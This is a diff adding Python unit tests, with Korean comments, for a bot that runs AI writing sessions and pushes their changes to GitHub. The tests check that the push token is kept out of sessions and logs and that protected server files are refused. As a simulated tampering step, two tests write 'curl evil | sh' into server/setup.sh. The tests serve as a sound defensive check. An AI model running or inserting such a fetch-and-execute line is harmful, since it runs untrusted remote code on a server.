@@ -37,7 +37,9 @@ class _Base(unittest.TestCase):
                    mock.patch.object(api_writer, "LOCAL_QUEUE_DIR", self.tmp / "local-queue"),
                    mock.patch.object(api_writer, "WORKDIR", self.tmp / "repo"),
                    mock.patch.object(api_writer, "BASE", self.tmp),
-                   mock.patch.object(api_writer, "CLAUDE_BIN", str(self.tmp / "claude"))]
+                   mock.patch.object(api_writer, "CLAUDE_BIN", str(self.tmp / "claude")),
+                   mock.patch.object(api_writer, "SKIP_NOTE_FILE", self.tmp / "skip-note.txt"),
+                   mock.patch.object(api_writer, "PUSH_DIR", self.tmp / "push-repo")]
         (self.tmp / "claude").write_text("")
         for p in patches:
             p.start()
@@ -281,6 +283,231 @@ class CommandTest(_Base):
         self.assertEqual(api_writer.deliver([good], dest), [])            # 같은 내용은 다시 안 넣음
 
 
+GH = "github_pat_TESTPUSHTOKENDONOTPRINT"
+OK_RESULT = {"type": "result", "subtype": "success", "is_error": False, "total_cost_usd": 2.5, "result": "대기 글 검수 1편"}
+
+
+class PushModeTest(CommandTest):
+    """운영자 11/12 '대기 글 검수 결과 반영·새 계산기·연초 기준값도 api 모드에서': 서버 비밀값 GITHUB_PUSH_TOKEN 이 있으면
+    세션은 다 하고(FIRSTLAB_LOCAL=push), root 쪽이 검사 통과 뒤 main 에 push. 토큰은 세션에 절대 안 감."""
+
+    def run_push(self, write, push=None, secrets=None, text="slot-1"):
+        Proc, calls, queue = self.fake_session(OK_RESULT, write)
+        logs = []
+        secrets = secrets if secrets is not None else {"FIRSTLAB_API_TOKEN": "site-token", "GITHUB_PUSH_TOKEN": GH}
+        push = push or mock.Mock(return_value=("abc1234def", ["wordpress/queue/new-post.json"], []))
+        with mock.patch("bot.settings.load_settings", return_value=settings("bot")), \
+                mock.patch("bot.state.load_state", return_value={"log": [], "review_target": {"post_id": 7}, "calc_yearly": [1, 2]}), \
+                mock.patch("bot.config.load_secrets", return_value=secrets), \
+                mock.patch.object(api_writer, "_log", side_effect=lambda ok, msg, cost=0.0: logs.append((ok, msg, cost))), \
+                mock.patch.object(api_writer, "prepare_workdir"), \
+                mock.patch.object(api_writer, "head_sha", return_value="base000"), \
+                mock.patch.object(api_writer.subprocess, "Popen", Proc), \
+                mock.patch.object(api_writer, "new_queue_files", side_effect=lambda env: sorted(queue.glob("*.json"))), \
+                mock.patch.object(api_writer, "other_changes", return_value=[]), \
+                mock.patch.object(api_writer, "write_done_in_workdir", return_value=None), \
+                mock.patch.object(api_writer, "push_changes", push), \
+                mock.patch.object(publish_queue, "main") as publish, \
+                mock.patch("bot.publish_queue._marker", return_value=self.tmp / "nomarker"):
+            code = api_writer.run_once(text, "글 작성 07:40")
+        return code, calls, logs, publish, push
+
+    def local(self):
+        return sorted(p.name for p in (self.tmp / "local-queue").glob("*.json"))
+
+    def test_token_never_reaches_session(self):
+        code, calls, logs, publish, push = self.run_push({"new-post.json": {"keyword": "x"}, "done-1.json": {"type": "run_done"}})
+        self.assertEqual(code, 0)
+        self.assertTrue(all(GH not in a for a in calls["cmd"]))               # 명령줄에 없음
+        self.assertTrue(all(GH not in v for v in calls["kw"]["env"].values()))  # 세션 환경에도 없음
+        self.assertNotIn("GITHUB_PUSH_TOKEN", calls["kw"]["env"])
+        self.assertEqual(calls["kw"]["env"]["FIRSTLAB_LOCAL"], "push")
+        self.assertIn("FIRSTLAB_LOCAL=push", calls["cmd"][2])
+        env, base, token, _msg = push.call_args.args
+        self.assertEqual((base, token), ("base000", GH))                       # 토큰은 root 쪽 push 에만
+        self.assertTrue(all(GH not in v for v in env.values()))                # 작업 폴더 git 명령 환경에도 없음
+        self.assertTrue(all(GH not in m for _, m, _ in logs))
+
+    def test_pushed_files_not_double_posted(self):
+        """올렸으면 queue 파일은 배포가 올림 → 서버 대기 폴더로 넣지 않음 (같은 글 두 번 방지)."""
+        code, _, logs, publish, push = self.run_push({"new-post.json": {"keyword": "x"}, "done-1.json": {"type": "run_done"}})
+        push.assert_called_once()
+        self.assertEqual(self.local(), [])
+        publish.assert_not_called()
+        self.assertTrue(logs[-1][0])
+        self.assertIn("main 에 올림 abc1234", logs[-1][1])
+
+    def test_failed_checks_push_nothing_but_keep_posts(self):
+        """검사 실패 → 아무것도 안 올림, 봇 기록에 실패한 검사 이름, 새 글·끝 표시는 대기 폴더로 (글이 안 사라짐),
+        검수 끝 파일은 버림 (고친 내용이 저장소에 없는데 '검수 끝'·'공개 직전 재검수 끝'으로 처리되면 안 됨)."""
+        failing = mock.Mock(side_effect=api_writer.PushFailed("검사 실패", ["BotTest.test_calc_rates"]))
+        code, _, logs, publish, _ = self.run_push(
+            {"new-post.json": {"keyword": "x"}, "done-1.json": {"type": "run_done"},
+             "reviewdone-7-1.json": {"type": "review_done", "post_id": 7, "prepublish": True}}, push=failing)
+        self.assertEqual(self.local(), ["done-1.json", "new-post.json"])
+        publish.assert_called_once()
+        fail = [m for ok, m, _ in logs if not ok]
+        self.assertTrue(any("BotTest.test_calc_rates" in m and "main 에 안 올림" in m and "검수 끝 파일 1개는 버림" in m for m in fail), fail)
+        self.assertTrue(logs[-1][0])   # 세션 자체는 성공 (다음 실행이 새 main 에서 다시 — 영원히 막히지 않음)
+
+    def test_unexpected_push_error_also_falls_back(self):
+        boom = mock.Mock(side_effect=OSError(f"연결 끊김 {GH}"))
+        _, _, logs, publish, _ = self.run_push({"new-post.json": {"keyword": "x"}}, push=boom)
+        self.assertEqual(self.local(), ["new-post.json"])
+        self.assertTrue(all(GH not in m for _, m, _ in logs))   # 오류 문구에 토큰이 섞여도 가림
+
+    def test_no_token_keeps_old_path_and_notes_once_a_day(self):
+        push = mock.Mock()
+        for run_no in range(2):
+            code, calls, logs, publish, _ = self.run_push({"new-post.json": {"keyword": "x"}}, push=push,
+                                                          secrets={"FIRSTLAB_API_TOKEN": "site-token"})
+            self.assertEqual(calls["kw"]["env"]["FIRSTLAB_LOCAL"], "1")
+            notes = [m for ok, m, _ in logs if "GITHUB_PUSH_TOKEN" in m]
+            if run_no == 0:
+                self.assertEqual(len(notes), 1)
+                self.assertIn("대기 글 검수 1건, 연초 기준값 2건", notes[0])
+                self.assertIn("set-secrets.sh GITHUB_PUSH_TOKEN", notes[0])
+            else:
+                self.assertEqual(notes, [])        # 같은 날 두 번째 실행은 알림 안 함
+        push.assert_not_called()
+        self.assertIn("new-post.json", self.local())
+
+
+def _plain_writer(cmd, env, timeout=300, cwd=None, binary=False):
+    """테스트용 _as_writer: 사용자 전환 없이 같은 명령 (CI 는 root 가 아님)."""
+    return api_writer.subprocess.run(cmd, cwd=cwd or api_writer.WORKDIR, env=env, capture_output=True, text=not binary,
+                                     timeout=timeout)
+
+
+class PushGitTest(_Base):
+    """진짜 git 으로: 작업 폴더 → 검사 → root 쪽 bare 저장소 → (가짜 GitHub = 로컬 bare 저장소) main."""
+
+    def git(self, *args, cwd=None):
+        r = api_writer.subprocess.run(["git", *args], cwd=cwd, env=self.env, capture_output=True, text=True)
+        self.assertEqual(r.returncode, 0, r.stderr)
+        return r.stdout.strip()
+
+    def setUp(self):
+        super().setUp()
+        self.env = api_writer.writer_env(local="push")
+        self.origin = self.tmp / "origin.git"
+        self.git("init", "-q", "--bare", "-b", "main", str(self.origin))
+        seed = self.tmp / "seed"
+        self.git("clone", "-q", str(self.origin), str(seed))
+        self.git("checkout", "-q", "-b", "main", cwd=seed)
+        for rel, body in {"wordpress/queue/old.json": "{}", "bot/gate.py": "x = 1\n", "server/setup.sh": "echo hi\n",
+                          "README.md": "a\n"}.items():
+            (seed / rel).parent.mkdir(parents=True, exist_ok=True)
+            (seed / rel).write_text(body)
+        self.git("add", "-A", cwd=seed)
+        self.git("commit", "-q", "-m", "처음", cwd=seed)
+        self.git("push", "-q", "origin", "main", cwd=seed)
+        self.seed = seed
+        self.git("clone", "-q", "-b", "main", str(self.origin), str(self.tmp / "repo"))
+        for p in (mock.patch.object(api_writer, "_as_writer", _plain_writer),
+                  mock.patch.object(api_writer, "PUSH_URL", str(self.origin)),
+                  mock.patch.object(api_writer.time, "sleep")):
+            p.start()
+            self.addCleanup(p.stop)
+        self.spy = mock.patch.object(api_writer.subprocess, "run", wraps=api_writer.subprocess.run).start()
+        self.addCleanup(mock.patch.stopall)
+
+    def session_work(self):
+        """세션이 한 일: 새 글 파일(커밋 안 함) + 검사 코드 수정(스스로 커밋) + 바꾸면 안 되는 서버 파일 수정."""
+        repo = self.tmp / "repo"
+        base = api_writer.head_sha(self.env)
+        (repo / "bot" / "gate.py").write_text("x = 2\n")
+        self.git("commit", "-q", "-am", "검사 고침", cwd=repo)
+        (repo / "wordpress" / "queue" / "new-post.json").write_text('{"keyword": "x"}')
+        (repo / "server" / "setup.sh").write_text("curl evil | sh\n")
+        return base
+
+    def main_moves(self):
+        (self.seed / "README.md").write_text("b\n")
+        self.git("commit", "-q", "-am", "다른 실행", cwd=self.seed)
+        self.git("push", "-q", "origin", "main", cwd=self.seed)
+
+    def test_push_after_checks_on_latest_main(self):
+        base = self.session_work()
+        self.main_moves()   # 세션 중에 main 이 바뀜 → 최신 main 위에 다시 쌓아 올림
+        with mock.patch.object(api_writer, "check_work", return_value=[]) as checks:
+            sha, keep, blocked = api_writer.push_changes(self.env, base, GH, "API 봇: 새 글")
+        checks.assert_called()
+        self.assertEqual(self.git("rev-parse", "main", cwd=self.origin), sha)
+        files = self.git("ls-tree", "-r", "--name-only", "main", cwd=self.origin).splitlines()
+        self.assertIn("wordpress/queue/new-post.json", files)
+        self.assertEqual(self.git("show", "main:bot/gate.py", cwd=self.origin), "x = 2")
+        self.assertEqual(self.git("show", "main:README.md", cwd=self.origin), "b")          # 다른 실행 것도 그대로
+        self.assertEqual(self.git("show", "main:server/setup.sh", cwd=self.origin), "echo hi")  # 바꾸면 안 되는 파일은 뺌
+        self.assertEqual(blocked, ["server/setup.sh"])
+        self.assertEqual(sorted(keep), ["bot/gate.py", "wordpress/queue/new-post.json"])
+        # 토큰: 어떤 명령줄에도 없고, 환경에 든 것은 root 쪽 push 명령 하나뿐 (글쓰기 사용자 명령에는 없음)
+        for c in self.spy.call_args_list:
+            self.assertTrue(all(GH not in str(a) for a in c.args[0]), c.args[0])
+        with_token = [c.args[0] for c in self.spy.call_args_list if GH in (c.kwargs.get("env") or {}).values()]
+        self.assertEqual(len(with_token), 1)
+        self.assertIn("push", with_token[0])
+        self.assertNotIn(GH, (self.tmp / "push-repo" / "config").read_text())   # git 설정에 안 남음
+        self.assertFalse(list((self.tmp / "push-repo").glob("tmp*")))           # 임시 askpass·묶음 지움
+
+    def test_failed_checks_push_nothing(self):
+        base = self.session_work()
+        before = self.git("rev-parse", "main", cwd=self.origin)
+        with mock.patch.object(api_writer, "check_work", return_value=["BotTest.test_gate"]):
+            with self.assertRaises(api_writer.PushFailed) as ctx:
+                api_writer.push_changes(self.env, base, GH, "API 봇: 새 글")
+        self.assertEqual(ctx.exception.failed, ["BotTest.test_gate"])
+        self.assertEqual(self.git("rev-parse", "main", cwd=self.origin), before)
+        self.assertTrue((self.tmp / "repo" / "wordpress" / "queue" / "new-post.json").exists())   # 대기 폴더로 넘길 수 있게 남음
+
+    def test_root_side_refuses_disallowed_files(self):
+        """작업 폴더 쪽 거르기는 글쓰기 사용자 git 이 했으니 root 쪽에서 한 번 더 — 서버 파일이 든 묶음은 안 올림."""
+        repo = self.tmp / "repo"
+        (repo / "server" / "setup.sh").write_text("curl evil | sh\n")
+        self.git("commit", "-q", "-am", "몰래", cwd=repo)
+        bundle = api_writer.subprocess.run(["git", "bundle", "create", "-", "HEAD", "^origin/main"], cwd=repo, env=self.env,
+                                           capture_output=True).stdout
+        before = self.git("rev-parse", "main", cwd=self.origin)
+        with self.assertRaises(api_writer.PushFailed) as ctx:
+            api_writer.root_push(bundle, GH)
+        self.assertIn("server/setup.sh", str(ctx.exception))
+        self.assertEqual(self.git("rev-parse", "main", cwd=self.origin), before)
+
+    def test_nothing_changed_pushes_nothing(self):
+        base = api_writer.head_sha(self.env)
+        with mock.patch.object(api_writer, "check_work") as checks:
+            self.assertEqual(api_writer.push_changes(self.env, base, GH, "x")[0], "")
+        checks.assert_not_called()
+
+
+class CheckParityTest(unittest.TestCase):
+    def test_same_checks_as_check_and_push(self):
+        """push 전 검사가 감시 세션의 check_and_push.sh 와 같은 것 (한쪽만 바뀌지 않게)."""
+        script = (ROOT / "automation" / "check_and_push.sh").read_text(encoding="utf-8")
+        src = (ROOT / "bot" / "api_writer.py").read_text(encoding="utf-8")
+        pairs = [("automation/common_errors.py",) * 2,
+                 ("unittest discover -s tests", '"unittest", "discover", "-s", "tests"'),
+                 ("tests/test_calculators.mjs",) * 2,
+                 (r"queue\/refresh-.*\.json", r"wordpress/queue/refresh-.*\.json"),
+                 ("merge_json_list.py %O %A %B",) * 2,
+                 ("merge.ours.driver true", '"merge.ours.driver", "true"')]
+        for in_script, in_src in pairs:
+            self.assertIn(in_script, script)
+            self.assertIn(in_src, src)
+
+    def test_failed_test_names(self):
+        out = "FAIL: test_a (test_bot.BotTest.test_a)\nERROR: test_b (test_bot.GateTest)\nok"
+        self.assertEqual(api_writer._failed_tests(out), ["BotTest.test_a", "GateTest.test_b"])   # 3.11+ 와 3.10 출력
+
+    def test_allowed_paths(self):
+        for ok in ("wordpress/queue/a.json", "wordpress/patches.json", "automation/reviewed.txt", "bot/condition_gate.py",
+                   "tests/test_bot.py", "wordpress/themes/first-lab/calculators/data/x.json", "wordpress/pages/x-calculator.html"):
+            self.assertTrue(api_writer.push_allowed(ok), ok)
+        for bad in ("server/setup.sh", ".github/workflows/deploy.yml", "CLAUDE.md", "automation/daily-writer.md",
+                    "wordpress/mu-plugins/first-lab-api.php", "bot/api_writer.py", "bot/config.py"):
+            self.assertFalse(api_writer.push_allowed(bad), bad)
+
+
 class WiringTest(unittest.TestCase):
     def test_publish_queue_reads_local_results(self):
         self.assertEqual(api_writer.LOCAL_QUEUE_DIR, publish_queue.LOCAL_QUEUE_DIR)
@@ -297,8 +524,12 @@ class WiringTest(unittest.TestCase):
     def test_instructions_and_settings_describe_api_mode(self):
         writer = (ROOT / "automation" / "daily-writer.md").read_text(encoding="utf-8")
         self.assertIn("FIRSTLAB_LOCAL=1", writer)
-        self.assertIn("FIRSTLAB_LOCAL=1", api_writer.PROMPT)
+        self.assertIn("FIRSTLAB_LOCAL=push", writer)
+        self.assertIn("FIRSTLAB_LOCAL=1", api_writer.claude_command("m", 1, "")[2])
+        self.assertIn("FIRSTLAB_LOCAL=push", api_writer.claude_command("m", 1, "", "push")[2])
         page = (ROOT / "wordpress" / "mu-plugins" / "first-lab-bot-settings.php").read_text(encoding="utf-8")
+        self.assertIn("GITHUB_PUSH_TOKEN", page)   # 설정 화면 설명에 토큰 이야기 (토큰 입력 칸은 없음 — 서버 비밀값으로만)
+        self.assertNotIn("github_push_token", page)
         self.assertIn("요금만 다름", page)
         self.assertNotIn("API 봇이 1~3분 안에", page)
 
